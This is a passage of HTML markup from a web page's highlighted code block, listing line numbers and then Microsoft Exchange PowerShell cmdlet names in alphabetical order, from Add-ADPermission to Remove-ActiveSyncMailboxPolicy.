class="line">726</span><br><span class="line">727</span><br><span class="line">728</span><br><span class="line">729</span><br><span class="line">730</span><br><span class="line">731</span><br><span class="line">732</span><br><span class="line">733</span><br><span class="line">734</span><br><span class="line">735</span><br><span class="line">736</span><br><span class="line">737</span><br><span class="line">738</span><br><span class="line">739</span><br><span class="line">740</span><br><span class="line">741</span><br><span class="line">742</span><br><span class="line">743</span><br><span class="line">744</span><br><span class="line">745</span><br><span class="line">746</span><br><span class="line">747</span><br><span class="line">748</span><br><span class="line">749</span><br><span class="line">750</span><br><span class="line">751</span><br><span class="line">752</span><br><span class="line">753</span><br><span class="line">754</span><br><span class="line">755</span><br><span class="line">756</span><br><span class="line">757</span><br><span class="line">758</span><br><span class="line">759</span><br><span class="line">760</span><br><span class="line">761</span><br><span class="line">762</span><br><span class="line">763</span><br><span class="line">764</span><br><span class="line">765</span><br><span class="line">766</span><br><span class="line">767</span><br><span class="line">768</span><br><span class="line">769</span><br><span class="line">770</span><br><span class="line">771</span><br><span class="line">772</span><br><span class="line">773</span><br><span class="line">774</span><br><span class="line">775</span><br><span class="line">776</span><br><span class="line">777</span><br><span class="line">778</span><br><span class="line">779</span><br><span class="line">780</span><br><span class="line">781</span><br><span class="line">782</span><br><span class="line">783</span><br><span class="line">784</span><br><span class="line">785</span><br><span class="line">786</span><br><span class="line">787</span><br><span class="line">788</span><br><span class="line">789</span><br><span class="line">790</span><br><span class="line">791</span><br><span class="line">792</span><br><span class="line">793</span><br><span class="line">794</span><br><span class="line">795</span><br><span class="line">796</span><br><span class="line">797</span><br><span class="line">798</span><br><span class="line">799</span><br><span class="line">800</span><br><span class="line">801</span><br><span class="line">802</span><br><span class="line">803</span><br><span class="line">804</span><br><span class="line">805</span><br><span class="line">806</span><br><span class="line">807</span><br><span class="line">808</span><br><span class="line">809</span><br><span class="line">810</span><br><span class="line">811</span><br><span class="line">812</span><br><span class="line">813</span><br><span class="line">814</span><br><span class="line">815</span><br><span class="line">816</span><br><span class="line">817</span><br><span class="line">818</span><br><span class="line">819</span><br><span class="line">820</span><br><span class="line">821</span><br><span class="line">822</span><br><span class="line">823</span><br><span class="line">824</span><br><span class="line">825</span><br><span class="line">826</span><br><span class="line">827</span><br><span class="line">828</span><br><span class="line">829</span><br><span class="line">830</span><br><span class="line">831</span><br><span class="line">832</span><br><span class="line">833</span><br><span class="line">834</span><br><span class="line">835</span><br><span class="line">836</span><br><span class="line">837</span><br><span class="line">838</span><br><span class="line">839</span><br><span class="line">840</span><br><span class="line">841</span><br><span class="line">842</span><br><span class="line">843</span><br><span class="line">844</span><br><span class="line">845</span><br><span class="line">846</span><br><span class="line">847</span><br><span class="line">848</span><br><span class="line">849</span><br><span class="line">850</span><br><span class="line">851</span><br><span class="line">852</span><br><span class="line">853</span><br><span class="line">854</span><br><span class="line">855</span><br><span class="line">856</span><br><span class="line">857</span><br><span class="line">858</span><br><span class="line">859</span><br><span class="line">860</span><br><span class="line">861</span><br><span class="line">862</span><br><span class="line">863</span><br><span class="line">864</span><br><span class="line">865</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">Add-ADPermission</span><br><span class="hljs-built_in">Add-AvailabilityAddressSpace</span><br><span class="hljs-built_in">Add-ContentFilterPhrase</span><br><span class="hljs-built_in">Add-DatabaseAvailabilityGroupServer</span><br><span class="hljs-built_in">Add-DistributionGroupMember</span><br><span class="hljs-built_in">Add-FederatedDomain</span><br><span class="hljs-built_in">Add-GlobalMonitoringOverride</span><br><span class="hljs-built_in">Add-IPAllowListEntry</span><br><span class="hljs-built_in">Add-IPAllowListProvider</span><br><span class="hljs-built_in">Add-IPBlockListEntry</span><br><span class="hljs-built_in">Add-IPBlockListProvider</span><br><span class="hljs-built_in">Add-MailboxDatabaseCopy</span><br><span class="hljs-built_in">Add-MailboxFolderPermission</span><br><span class="hljs-built_in">Add-MailboxLocation</span><br><span class="hljs-built_in">Add-MailboxPermission</span><br><span class="hljs-built_in">Add-ManagementRoleEntry</span><br><span class="hljs-built_in">Add-PublicFolderClientPermission</span><br><span class="hljs-built_in">Add-ResubmitRequest</span><br><span class="hljs-built_in">Add-RoleGroupMember</span><br><span class="hljs-built_in">Add-ServerMonitoringOverride</span><br><span class="hljs-built_in">Clear-ActiveSyncDevice</span><br><span class="hljs-built_in">Clear-MobileDevice</span><br><span class="hljs-built_in">Clear-TextMessagingAccount</span><br><span class="hljs-built_in">Compare-TextMessagingVerificationCode</span><br><span class="hljs-built_in">Complete-MigrationBatch</span><br><span class="hljs-built_in">Connect-Mailbox</span><br><span class="hljs-built_in">Disable-AddressListPaging</span><br><span class="hljs-built_in">Disable-App</span><br><span class="hljs-built_in">Disable-CmdletExtensionAgent</span><br><span class="hljs-built_in">Disable-DistributionGroup</span><br><span class="hljs-built_in">Disable-InboxRule</span><br><span class="hljs-built_in">Disable-JournalRule</span><br><span class="hljs-built_in">Disable-Mailbox</span><br><span class="hljs-built_in">Disable-MailboxQuarantine</span><br><span class="hljs-built_in">Disable-MailContact</span><br><span class="hljs-built_in">Disable-MailPublicFolder</span><br><span class="hljs-built_in">Disable-MailUser</span><br><span class="hljs-built_in">Disable-MalwareFilterRule</span><br><span class="hljs-built_in">Disable-OutlookProtectionRule</span><br><span class="hljs-built_in">Disable-PushNotificationProxy</span><br><span class="hljs-built_in">Disable-RemoteMailbox</span><br><span class="hljs-built_in">Disable-ServiceEmailChannel</span><br><span class="hljs-built_in">Disable-SweepRule</span><br><span class="hljs-built_in">Disable-TransportAgent</span><br><span class="hljs-built_in">Disable-TransportRule</span><br><span class="hljs-built_in">Disable-UMAutoAttendant</span><br><span class="hljs-built_in">Disable-UMCallAnsweringRule</span><br><span class="hljs-built_in">Disable-UMIPGateway</span><br><span class="hljs-built_in">Disable-UMMailbox</span><br><span class="hljs-built_in">Disable-UMService</span><br><span class="hljs-built_in">Dismount-Database</span><br>Dump<span class="hljs-literal">-ProvisioningCache</span><br><span class="hljs-built_in">Enable-AddressListPaging</span><br><span class="hljs-built_in">Enable-AntispamUpdates</span><br><span class="hljs-built_in">Enable-App</span><br><span class="hljs-built_in">Enable-CmdletExtensionAgent</span><br><span class="hljs-built_in">Enable-DistributionGroup</span><br><span class="hljs-built_in">Enable-ExchangeCertificate</span><br><span class="hljs-built_in">Enable-InboxRule</span><br><span class="hljs-built_in">Enable-JournalRule</span><br><span class="hljs-built_in">Enable-Mailbox</span><br><span class="hljs-built_in">Enable-MailboxQuarantine</span><br><span class="hljs-built_in">Enable-MailContact</span><br><span class="hljs-built_in">Enable-MailPublicFolder</span><br><span class="hljs-built_in">Enable-MailUser</span><br><span class="hljs-built_in">Enable-MalwareFilterRule</span><br><span class="hljs-built_in">Enable-OutlookProtectionRule</span><br><span class="hljs-built_in">Enable-PushNotificationProxy</span><br><span class="hljs-built_in">Enable-RemoteMailbox</span><br><span class="hljs-built_in">Enable-ServiceEmailChannel</span><br><span class="hljs-built_in">Enable-SweepRule</span><br><span class="hljs-built_in">Enable-TransportAgent</span><br><span class="hljs-built_in">Enable-TransportRule</span><br><span class="hljs-built_in">Enable-UMAutoAttendant</span><br><span class="hljs-built_in">Enable-UMCallAnsweringRule</span><br><span class="hljs-built_in">Enable-UMIPGateway</span><br><span class="hljs-built_in">Enable-UMMailbox</span><br><span class="hljs-built_in">Enable-UMService</span><br><span class="hljs-built_in">Export-ActiveSyncLog</span><br><span class="hljs-built_in">Export-AutoDiscoverConfig</span><br><span class="hljs-built_in">Export-DlpPolicyCollection</span><br><span class="hljs-built_in">Export-ExchangeCertificate</span><br><span class="hljs-built_in">Export-JournalRuleCollection</span><br><span class="hljs-built_in">Export-MailboxDiagnosticLogs</span><br><span class="hljs-built_in">Export-Message</span><br><span class="hljs-built_in">Export-MigrationReport</span><br><span class="hljs-built_in">Export-RecipientDataProperty</span><br><span class="hljs-built_in">Export-TransportRuleCollection</span><br><span class="hljs-built_in">Export-UMCallDataRecord</span><br><span class="hljs-built_in">Export-UMPrompt</span><br><span class="hljs-built_in">Get-AcceptedDomain</span><br><span class="hljs-built_in">Get-ActiveSyncDevice</span><br><span class="hljs-built_in">Get-ActiveSyncDeviceAccessRule</span><br><span class="hljs-built_in">Get-ActiveSyncDeviceAutoblockThreshold</span><br><span class="hljs-built_in">Get-ActiveSyncDeviceClass</span><br><span class="hljs-built_in">Get-ActiveSyncDeviceStatistics</span><br><span class="hljs-built_in">Get-ActiveSyncMailboxPolicy</span><br><span class="hljs-built_in">Get-ActiveSyncOrganizationSettings</span><br><span class="hljs-built_in">Get-ActiveSyncVirtualDirectory</span><br><span class="hljs-built_in">Get-AddressBookPolicy</span><br><span class="hljs-built_in">Get-AddressList</span><br><span class="hljs-built_in">Get-AdminAuditLogConfig</span><br><span class="hljs-built_in">Get-AdministrativeUnit</span><br><span class="hljs-built_in">Get-ADPermission</span><br><span class="hljs-built_in">Get-ADServerSettings</span><br><span class="hljs-built_in">Get-ADSite</span><br><span class="hljs-built_in">Get-AdSiteLink</span><br><span class="hljs-built_in">Get-AgentLog</span><br><span class="hljs-built_in">Get-AgentTrafficTypeSubscription</span><br><span class="hljs-built_in">Get-App</span><br><span class="hljs-built_in">Get-AuditLogSearch</span><br><span class="hljs-built_in">Get-AuthConfig</span><br><span class="hljs-built_in">Get-AuthRedirect</span><br><span class="hljs-built_in">Get-AuthServer</span><br><span class="hljs-built_in">Get-AutodiscoverVirtualDirectory</span><br><span class="hljs-built_in">Get-AvailabilityAddressSpace</span><br><span class="hljs-built_in">Get-AvailabilityConfig</span><br><span class="hljs-built_in">Get-CalendarDiagnosticAnalysis</span><br><span class="hljs-built_in">Get-CalendarDiagnosticLog</span><br><span class="hljs-built_in">Get-CalendarNotification</span><br><span class="hljs-built_in">Get-CalendarProcessing</span><br><span class="hljs-built_in">Get-CASMailbox</span><br><span class="hljs-built_in">Get-CASMailboxPlan</span><br><span class="hljs-built_in">Get-ClassificationRuleCollection</span><br><span class="hljs-built_in">Get-ClientAccessArray</span><br><span class="hljs-built_in">Get-ClientAccessServer</span><br><span class="hljs-built_in">Get-ClientAccessService</span><br><span class="hljs-built_in">Get-CmdletExtensionAgent</span><br><span class="hljs-built_in">Get-Command</span><br><span class="hljs-built_in">Get-ComplianceServiceVirtualDirectory</span><br><span class="hljs-built_in">Get-ConsumerGroup</span><br><span class="hljs-built_in">Get-ConsumerMailbox</span><br><span class="hljs-built_in">Get-Contact</span><br><span class="hljs-built_in">Get-ContentFilterConfig</span><br><span class="hljs-built_in">Get-ContentFilterPhrase</span><br><span class="hljs-built_in">Get-DatabaseAvailabilityGroup</span><br><span class="hljs-built_in">Get-DatabaseAvailabilityGroupConfiguration</span><br><span class="hljs-built_in">Get-DatabaseAvailabilityGroupNetwork</span><br><span class="hljs-built_in">Get-DataClassification</span><br><span class="hljs-built_in">Get-DefaultFolderHistory</span><br><span class="hljs-built_in">Get-DeliveryAgentConnector</span><br><span class="hljs-built_in">Get-DetailsTemplate</span><br><span class="hljs-built_in">Get-DistributionGroup</span><br><span class="hljs-built_in">Get-DistributionGroupMember</span><br><span class="hljs-built_in">Get-DlpPolicy</span><br><span class="hljs-built_in">Get-DlpPolicyTemplate</span><br><span class="hljs-built_in">Get-DomainController</span><br><span class="hljs-built_in">Get-DynamicDistributionGroup</span><br><span class="hljs-built_in">Get-EcpVirtualDirectory</span><br><span class="hljs-built_in">Get-EdgeSubscription</span><br><span class="hljs-built_in">Get-EdgeSyncServiceConfig</span><br><span class="hljs-built_in">Get-EligibleDistributionGroupForMigration</span><br><span class="hljs-built_in">Get-EmailAddressPolicy</span><br><span class="hljs-built_in">Get-EventLogLevel</span><br><span class="hljs-built_in">Get-ExchangeAssistanceConfig</span><br><span class="hljs-built_in">Get-ExchangeCertificate</span><br><span class="hljs-built_in">Get-ExchangeDiagnosticInfo</span><br><span class="hljs-built_in">Get-ExchangeServer</span><br><span class="hljs-built_in">Get-ExchangeServerAccessLicense</span><br><span class="hljs-built_in">Get-ExchangeServerAccessLicenseUser</span><br><span class="hljs-built_in">Get-FailedContentIndexDocuments</span><br><span class="hljs-built_in">Get-FederatedDomainProof</span><br><span class="hljs-built_in">Get-FederatedOrganizationIdentifier</span><br><span class="hljs-built_in">Get-FederationInformation</span><br><span class="hljs-built_in">Get-FederationTrust</span><br><span class="hljs-built_in">Get-ForeignConnector</span><br><span class="hljs-built_in">Get-FrontendTransportService</span><br><span class="hljs-built_in">Get-GlobalAddressList</span><br><span class="hljs-built_in">Get-GlobalMonitoringOverride</span><br><span class="hljs-built_in">Get-Group</span><br><span class="hljs-built_in">Get-HealthReport</span><br><span class="hljs-built_in">Get-Help</span><br><span class="hljs-built_in">Get-HostedContentFilterRule</span><br><span class="hljs-built_in">Get-HybridConfiguration</span><br><span class="hljs-built_in">Get-ImapSettings</span><br><span class="hljs-built_in">Get-InboxRule</span><br><span class="hljs-built_in">Get-IntraOrganizationConfiguration</span><br><span class="hljs-built_in">Get-IntraOrganizationConnector</span><br><span class="hljs-built_in">Get-IPAllowListConfig</span><br><span class="hljs-built_in">Get-IPAllowListEntry</span><br><span class="hljs-built_in">Get-IPAllowListProvider</span><br><span class="hljs-built_in">Get-IPAllowListProvidersConfig</span><br><span class="hljs-built_in">Get-IPBlockListConfig</span><br><span class="hljs-built_in">Get-IPBlockListEntry</span><br><span class="hljs-built_in">Get-IPBlockListProvider</span><br><span class="hljs-built_in">Get-IPBlockListProvidersConfig</span><br><span class="hljs-built_in">Get-IRMConfiguration</span><br><span class="hljs-built_in">Get-JournalRule</span><br><span class="hljs-built_in">Get-LAMDefinitions</span><br><span class="hljs-built_in">Get-LAMResults</span><br><span class="hljs-built_in">Get-LogExportVirtualDirectory</span><br><span class="hljs-built_in">Get-LogonStatistics</span><br><span class="hljs-built_in">Get-Mailbox</span><br><span class="hljs-built_in">Get-MailboxAuditBypassAssociation</span><br><span class="hljs-built_in">Get-MailboxAutoReplyConfiguration</span><br><span class="hljs-built_in">Get-MailboxCalendarConfiguration</span><br><span class="hljs-built_in">Get-MailboxCalendarFolder</span><br><span class="hljs-built_in">Get-MailboxDatabase</span><br><span class="hljs-built_in">Get-MailboxDatabaseCopyStatus</span><br><span class="hljs-built_in">Get-MailboxDatabaseRedundancy</span><br><span class="hljs-built_in">Get-MailboxDeliveryVirtualDirectory</span><br><span class="hljs-built_in">Get-MailboxFolder</span><br><span class="hljs-built_in">Get-MailboxFolderPermission</span><br><span class="hljs-built_in">Get-MailboxFolderStatistics</span><br><span class="hljs-built_in">Get-MailboxJunkEmailConfiguration</span><br><span class="hljs-built_in">Get-MailboxLocation</span><br><span class="hljs-built_in">Get-MailboxMessageConfiguration</span><br><span class="hljs-built_in">Get-MailboxPermission</span><br><span class="hljs-built_in">Get-MailboxPreferredLocation</span><br><span class="hljs-built_in">Get-MailboxRegionalConfiguration</span><br><span class="hljs-built_in">Get-MailboxRelocationRequestStatistics</span><br><span class="hljs-built_in">Get-MailboxRepairRequest</span><br><span class="hljs-built_in">Get-MailboxRestoreRequest</span><br><span class="hljs-built_in">Get-MailboxRestoreRequestStatistics</span><br><span class="hljs-built_in">Get-MailboxSearch</span><br><span class="hljs-built_in">Get-MailboxServer</span><br><span class="hljs-built_in">Get-MailboxServerRedundancy</span><br><span class="hljs-built_in">Get-MailboxSpellingConfiguration</span><br><span class="hljs-built_in">Get-MailboxStatistics</span><br><span class="hljs-built_in">Get-MailboxTransportService</span><br><span class="hljs-built_in">Get-MailboxUserConfiguration</span><br><span class="hljs-built_in">Get-MailContact</span><br><span class="hljs-built_in">Get-MailPublicFolder</span><br><span class="hljs-built_in">Get-MailUser</span><br><span class="hljs-built_in">Get-MalwareFilteringServer</span><br><span class="hljs-built_in">Get-MalwareFilterPolicy</span><br><span class="hljs-built_in">Get-MalwareFilterRule</span><br><span class="hljs-built_in">Get-ManagementRole</span><br><span class="hljs-built_in">Get-ManagementRoleAssignment</span><br><span class="hljs-built_in">Get-ManagementRoleEntry</span><br><span class="hljs-built_in">Get-ManagementScope</span><br><span class="hljs-built_in">Get-MapiVirtualDirectory</span><br><span class="hljs-built_in">Get-Message</span><br><span class="hljs-built_in">Get-MessageCategory</span><br><span class="hljs-built_in">Get-MessageClassification</span><br><span class="hljs-built_in">Get-MessageTrackingLog</span><br><span class="hljs-built_in">Get-MessageTrackingReport</span><br><span class="hljs-built_in">Get-MigrationBatch</span><br><span class="hljs-built_in">Get-MigrationConfig</span><br><span class="hljs-built_in">Get-MigrationEndpoint</span><br><span class="hljs-built_in">Get-MigrationStatistics</span><br><span class="hljs-built_in">Get-MigrationUser</span><br><span class="hljs-built_in">Get-MigrationUserStatistics</span><br><span class="hljs-built_in">Get-MobileDevice</span><br><span class="hljs-built_in">Get-MobileDeviceMailboxPolicy</span><br><span class="hljs-built_in">Get-MobileDeviceStatistics</span><br><span class="hljs-built_in">Get-MonitoringItemHelp</span><br><span class="hljs-built_in">Get-MonitoringItemIdentity</span><br><span class="hljs-built_in">Get-MoveRequest</span><br><span class="hljs-built_in">Get-MoveRequestStatistics</span><br><span class="hljs-built_in">Get-MRSRequest</span><br><span class="hljs-built_in">Get-MRSRequestStatistics</span><br><span class="hljs-built_in">Get-NetworkConnectionInfo</span><br><span class="hljs-built_in">Get-Notification</span><br><span class="hljs-built_in">Get-OabVirtualDirectory</span><br><span class="hljs-built_in">Get-OfflineAddressBook</span><br><span class="hljs-built_in">Get-OnlineMeetingConfiguration</span><br><span class="hljs-built_in">Get-OrganizationalUnit</span><br><span class="hljs-built_in">Get-OrganizationConfig</span><br><span class="hljs-built_in">Get-OrganizationRelationship</span><br><span class="hljs-built_in">Get-OutlookAnywhere</span><br><span class="hljs-built_in">Get-OutlookProtectionRule</span><br><span class="hljs-built_in">Get-OutlookProvider</span><br><span class="hljs-built_in">Get-OutlookServiceVirtualDirectory</span><br><span class="hljs-built_in">Get-OwaMailboxPolicy</span><br><span class="hljs-built_in">Get-OwaVirtualDirectory</span><br><span class="hljs-built_in">Get-PartnerApplication</span><br><span class="hljs-built_in">Get-PendingFederatedDomain</span><br><span class="hljs-built_in">Get-PhysicalAvailabilityReport</span><br><span class="hljs-built_in">Get-PolicyTipConfig</span><br><span class="hljs-built_in">Get-PopSettings</span><br><span class="hljs-built_in">Get-PowerShellVirtualDirectory</span><br><span class="hljs-built_in">Get-ProcessInfo</span><br><span class="hljs-built_in">Get-PublicFolder</span><br><span class="hljs-built_in">Get-PublicFolderClientPermission</span><br><span class="hljs-built_in">Get-PublicFolderDatabase</span><br><span class="hljs-built_in">Get-PublicFolderItemStatistics</span><br><span class="hljs-built_in">Get-PublicFolderMailboxDiagnostics</span><br><span class="hljs-built_in">Get-PublicFolderMailboxMigrationRequest</span><br><span class="hljs-built_in">Get-PublicFolderMailboxMigrationRequestStatistics</span><br><span class="hljs-built_in">Get-PublicFolderMigrationRequest</span><br><span class="hljs-built_in">Get-PublicFolderMigrationRequestStatistics</span><br><span class="hljs-built_in">Get-PublicFolderMoveRequest</span><br><span class="hljs-built_in">Get-PublicFolderMoveRequestStatistics</span><br><span class="hljs-built_in">Get-PublicFolderStatistics</span><br><span class="hljs-built_in">Get-PushNotificationSubscription</span><br><span class="hljs-built_in">Get-Queue</span><br><span class="hljs-built_in">Get-QueueDigest</span><br><span class="hljs-built_in">Get-RbacDiagnosticInfo</span><br><span class="hljs-built_in">Get-ReceiveConnector</span><br><span class="hljs-built_in">Get-Recipient</span><br><span class="hljs-built_in">Get-RecipientFilterConfig</span><br><span class="hljs-built_in">Get-RemoteDomain</span><br><span class="hljs-built_in">Get-RemoteMailbox</span><br><span class="hljs-built_in">Get-ResourceConfig</span><br><span class="hljs-built_in">Get-RestVirtualDirectory</span><br><span class="hljs-built_in">Get-ResubmitRequest</span><br><span class="hljs-built_in">Get-RetentionPolicy</span><br><span class="hljs-built_in">Get-RetentionPolicyTag</span><br><span class="hljs-built_in">Get-RMSTemplate</span><br><span class="hljs-built_in">Get-RoleAssignmentPolicy</span><br><span class="hljs-built_in">Get-RoleGroup</span><br><span class="hljs-built_in">Get-RoleGroupMember</span><br><span class="hljs-built_in">Get-RpcClientAccess</span><br><span class="hljs-built_in">Get-SearchDocumentFormat</span><br><span class="hljs-built_in">Get-SecurityPrincipal</span><br><span class="hljs-built_in">Get-SendConnector</span><br><span class="hljs-built_in">Get-SenderFilterConfig</span><br><span class="hljs-built_in">Get-SenderIdConfig</span><br><span class="hljs-built_in">Get-SenderReputationConfig</span><br><span class="hljs-built_in">Get-ServerComponentState</span><br><span class="hljs-built_in">Get-ServerHealth</span><br><span class="hljs-built_in">Get-ServerMonitoringOverride</span><br><span class="hljs-built_in">Get-ServiceAvailabilityReport</span><br><span class="hljs-built_in">Get-ServiceStatus</span><br><span class="hljs-built_in">Get-SettingOverride</span><br><span class="hljs-built_in">Get-SharingPolicy</span><br><span class="hljs-built_in">Get-SiteMailbox</span><br><span class="hljs-built_in">Get-SiteMailboxDiagnostics</span><br><span class="hljs-built_in">Get-SiteMailboxProvisioningPolicy</span><br><span class="hljs-built_in">Get-SmimeConfig</span><br><span class="hljs-built_in">Get-StoreUsageStatistics</span><br><span class="hljs-built_in">Get-SubmissionMalwareFilteringServer</span><br><span class="hljs-built_in">Get-SweepRule</span><br><span class="hljs-built_in">Get-SyncConfig</span><br><span class="hljs-built_in">Get-SystemMessage</span><br><span class="hljs-built_in">Get-TextMessagingAccount</span><br><span class="hljs-built_in">Get-ThrottlingPolicy</span><br><span class="hljs-built_in">Get-ThrottlingPolicyAssociation</span><br><span class="hljs-built_in">Get-TimeRange</span><br><span class="hljs-built_in">Get-TransportAgent</span><br><span class="hljs-built_in">Get-TransportConfig</span><br><span class="hljs-built_in">Get-TransportPipeline</span><br><span class="hljs-built_in">Get-TransportRule</span><br><span class="hljs-built_in">Get-TransportRuleAction</span><br><span class="hljs-built_in">Get-TransportRulePredicate</span><br><span class="hljs-built_in">Get-TransportServer</span><br><span class="hljs-built_in">Get-TransportService</span><br><span class="hljs-built_in">Get-Trust</span><br><span class="hljs-built_in">Get-UMActiveCalls</span><br><span class="hljs-built_in">Get-UMAutoAttendant</span><br><span class="hljs-built_in">Get-UMCallAnsweringRule</span><br><span class="hljs-built_in">Get-UMCallDataRecord</span><br><span class="hljs-built_in">Get-UMCallRouterSettings</span><br><span class="hljs-built_in">Get-UMCallSummaryReport</span><br><span class="hljs-built_in">Get-UMDialPlan</span><br><span class="hljs-built_in">Get-UMHuntGroup</span><br><span class="hljs-built_in">Get-UMIPGateway</span><br><span class="hljs-built_in">Get-UMMailbox</span><br><span class="hljs-built_in">Get-UMMailboxConfiguration</span><br><span class="hljs-built_in">Get-UMMailboxPIN</span><br><span class="hljs-built_in">Get-UMMailboxPolicy</span><br><span class="hljs-built_in">Get-UMPhoneSession</span><br><span class="hljs-built_in">Get-UMService</span><br><span class="hljs-built_in">Get-UnifiedAuditSetting</span><br><span class="hljs-built_in">Get-User</span><br><span class="hljs-built_in">Get-UserPhoto</span><br><span class="hljs-built_in">Get-UserPrincipalNamesSuffix</span><br><span class="hljs-built_in">Get-WebServicesVirtualDirectory</span><br><span class="hljs-built_in">Get-X400AuthoritativeDomain</span><br><span class="hljs-built_in">Import-DlpPolicyCollection</span><br><span class="hljs-built_in">Import-DlpPolicyTemplate</span><br><span class="hljs-built_in">Import-ExchangeCertificate</span><br><span class="hljs-built_in">Import-JournalRuleCollection</span><br><span class="hljs-built_in">Import-RecipientDataProperty</span><br><span class="hljs-built_in">Import-TransportRuleCollection</span><br><span class="hljs-built_in">Import-UMPrompt</span><br><span class="hljs-built_in">Install-TransportAgent</span><br><span class="hljs-built_in">Invoke-MonitoringProbe</span><br><span class="hljs-built_in">Mount-Database</span><br><span class="hljs-built_in">Move-ActiveMailboxDatabase</span><br><span class="hljs-built_in">Move-AddressList</span><br><span class="hljs-built_in">Move-DatabasePath</span><br><span class="hljs-built_in">Move-OfflineAddressBook</span><br><span class="hljs-built_in">New-AcceptedDomain</span><br><span class="hljs-built_in">New-ActiveSyncDeviceAccessRule</span><br><span class="hljs-built_in">New-ActiveSyncMailboxPolicy</span><br><span class="hljs-built_in">New-ActiveSyncVirtualDirectory</span><br><span class="hljs-built_in">New-AddressBookPolicy</span><br><span class="hljs-built_in">New-AddressList</span><br><span class="hljs-built_in">New-AdminAuditLogSearch</span><br><span class="hljs-built_in">New-App</span><br><span class="hljs-built_in">New-AuthRedirect</span><br><span class="hljs-built_in">New-AuthServer</span><br><span class="hljs-built_in">New-AutodiscoverVirtualDirectory</span><br><span class="hljs-built_in">New-ClassificationRuleCollection</span><br><span class="hljs-built_in">New-CompliancePolicySyncNotification</span><br><span class="hljs-built_in">New-ComplianceServiceVirtualDirectory</span><br><span class="hljs-built_in">New-ConsumerGroup</span><br><span class="hljs-built_in">New-DatabaseAvailabilityGroup</span><br><span class="hljs-built_in">New-DatabaseAvailabilityGroupConfiguration</span><br><span class="hljs-built_in">New-DatabaseAvailabilityGroupNetwork</span><br><span class="hljs-built_in">New-DataClassification</span><br><span class="hljs-built_in">New-DeliveryAgentConnector</span><br><span class="hljs-built_in">New-DistributionGroup</span><br><span class="hljs-built_in">New-DlpPolicy</span><br><span class="hljs-built_in">New-DynamicDistributionGroup</span><br><span class="hljs-built_in">New-EcpVirtualDirectory</span><br><span class="hljs-built_in">New-EdgeSubscription</span><br><span class="hljs-built_in">New-EdgeSyncServiceConfig</span><br><span class="hljs-built_in">New-EmailAddressPolicy</span><br><span class="hljs-built_in">New-ExchangeCertificate</span><br><span class="hljs-built_in">New-FederationTrust</span><br><span class="hljs-built_in">New-Fingerprint</span><br><span class="hljs-built_in">New-ForeignConnector</span><br><span class="hljs-built_in">New-GlobalAddressList</span><br><span class="hljs-built_in">New-HybridConfiguration</span><br><span class="hljs-built_in">New-InboxRule</span><br><span class="hljs-built_in">New-IntraOrganizationConnector</span><br><span class="hljs-built_in">New-JournalRule</span><br><span class="hljs-built_in">New-Mailbox</span><br><span class="hljs-built_in">New-MailboxAuditLogSearch</span><br><span class="hljs-built_in">New-MailboxDatabase</span><br><span class="hljs-built_in">New-MailboxDeliveryVirtualDirectory</span><br><span class="hljs-built_in">New-MailboxFolder</span><br><span class="hljs-built_in">New-MailboxRelocationRequest</span><br><span class="hljs-built_in">New-MailboxRepairRequest</span><br><span class="hljs-built_in">New-MailboxRestoreRequest</span><br><span class="hljs-built_in">New-MailboxSearch</span><br><span class="hljs-built_in">New-MailContact</span><br><span class="hljs-built_in">New-MailMessage</span><br><span class="hljs-built_in">New-MailUser</span><br><span class="hljs-built_in">New-MalwareFilterPolicy</span><br><span class="hljs-built_in">New-MalwareFilterRule</span><br><span class="hljs-built_in">New-ManagementRole</span><br><span class="hljs-built_in">New-ManagementRoleAssignment</span><br><span class="hljs-built_in">New-ManagementScope</span><br><span class="hljs-built_in">New-MapiVirtualDirectory</span><br><span class="hljs-built_in">New-MessageClassification</span><br><span class="hljs-built_in">New-MigrationBatch</span><br><span class="hljs-built_in">New-MigrationEndpoint</span><br><span class="hljs-built_in">New-MobileDeviceMailboxPolicy</span><br><span class="hljs-built_in">New-MoveRequest</span><br><span class="hljs-built_in">New-OabVirtualDirectory</span><br><span class="hljs-built_in">New-OfflineAddressBook</span><br><span class="hljs-built_in">New-OrganizationRelationship</span><br><span class="hljs-built_in">New-OutlookProtectionRule</span><br><span class="hljs-built_in">New-OutlookProvider</span><br><span class="hljs-built_in">New-OutlookServiceVirtualDirectory</span><br><span class="hljs-built_in">New-OwaMailboxPolicy</span><br><span class="hljs-built_in">New-OwaVirtualDirectory</span><br><span class="hljs-built_in">New-PartnerApplication</span><br><span class="hljs-built_in">New-PolicyTipConfig</span><br><span class="hljs-built_in">New-PowerShellVirtualDirectory</span><br><span class="hljs-built_in">New-ProtectionServicePolicy</span><br><span class="hljs-built_in">New-PublicFolder</span><br><span class="hljs-built_in">New-PublicFolderMigrationRequest</span><br><span class="hljs-built_in">New-PublicFolderMoveRequest</span><br><span class="hljs-built_in">New-ReceiveConnector</span><br><span class="hljs-built_in">New-RemoteDomain</span><br><span class="hljs-built_in">New-RemoteMailbox</span><br><span class="hljs-built_in">New-RestVirtualDirectory</span><br><span class="hljs-built_in">New-RetentionPolicy</span><br><span class="hljs-built_in">New-RetentionPolicyTag</span><br><span class="hljs-built_in">New-RoleAssignmentPolicy</span><br><span class="hljs-built_in">New-RoleGroup</span><br><span class="hljs-built_in">New-SearchDocumentFormat</span><br><span class="hljs-built_in">New-SendConnector</span><br><span class="hljs-built_in">New-SettingOverride</span><br><span class="hljs-built_in">New-SharingPolicy</span><br><span class="hljs-built_in">New-SiteMailbox</span><br><span class="hljs-built_in">New-SiteMailboxProvisioningPolicy</span><br><span class="hljs-built_in">New-SweepRule</span><br><span class="hljs-built_in">New-SyncMailPublicFolder</span><br><span class="hljs-built_in">New-SystemMessage</span><br><span class="hljs-built_in">New-ThrottlingPolicy</span><br><span class="hljs-built_in">New-TransportRule</span><br><span class="hljs-built_in">New-UMAutoAttendant</span><br><span class="hljs-built_in">New-UMCallAnsweringRule</span><br><span class="hljs-built_in">New-UMDialPlan</span><br><span class="hljs-built_in">New-UMHuntGroup</span><br><span class="hljs-built_in">New-UMIPGateway</span><br><span class="hljs-built_in">New-UMMailboxPolicy</span><br><span class="hljs-built_in">New-WebServicesVirtualDirectory</span><br><span class="hljs-built_in">New-X400AuthoritativeDomain</span><br>Redirect<span class="hljs-literal">-Message</span><br><span class="hljs-built_in">Remove-AcceptedDomain</span><br><span class="hljs-built_in">Remove-ActiveSyncDevice</span><br><span class="hljs-built_in">Remove-ActiveSyncDeviceAccessRule</span><br><span class="hljs-built_in">Remove-ActiveSyncDeviceClass</span><br><span class="hljs-built_in">Remove-ActiveSyncMailboxPolicy</span><br><span 